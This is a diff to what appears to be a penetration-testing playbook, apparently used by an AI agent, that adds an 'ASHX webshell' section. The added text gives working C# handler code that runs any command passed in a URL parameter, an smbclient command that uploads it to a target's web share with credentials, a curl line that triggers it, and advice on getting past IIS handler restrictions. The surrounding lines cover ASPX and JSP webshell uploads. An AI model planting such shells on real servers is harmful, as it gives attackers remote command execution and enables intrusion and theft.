@@ -197,6 +197,25 @@ smbclient "//TARGET/Web" -U 'DOMAIN\user' --password='PASSWORD' -c \
   'put /tmp/claude-1000/shell.aspx shell.aspx'
 ```
 
+### ASHX webshell (IIS generic handler)
+
+Use when ASPX returns 500 errors (handler restrictions, .NET version mismatch).
+ASHX generic handlers bypass many IIS restrictions that block ASPX pages.
+
+```bash
+# Minimal ASHX command shell
+cat > /tmp/claude-1000/shell.ashx << 'ASHX'
+<%@ WebHandler Language="C#" Class="H" %>
+using System;using System.Web;using System.Diagnostics;
+public class H:IHttpHandler{public void ProcessRequest(HttpContext c){c.Response.Write(Process.Start(new ProcessStartInfo("cmd","/c "+c.Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd());}public bool IsReusable{get{return false;}}}
+ASHX
+
+smbclient "//TARGET/Web" -U 'DOMAIN\user' --password='PASSWORD' -c \
+  'put /tmp/claude-1000/shell.ashx shell.ashx'
+
+# Trigger: curl -s "http://TARGET/shell.ashx?c=whoami"
+```
+
 ### JSP webshell
 
 ```bash
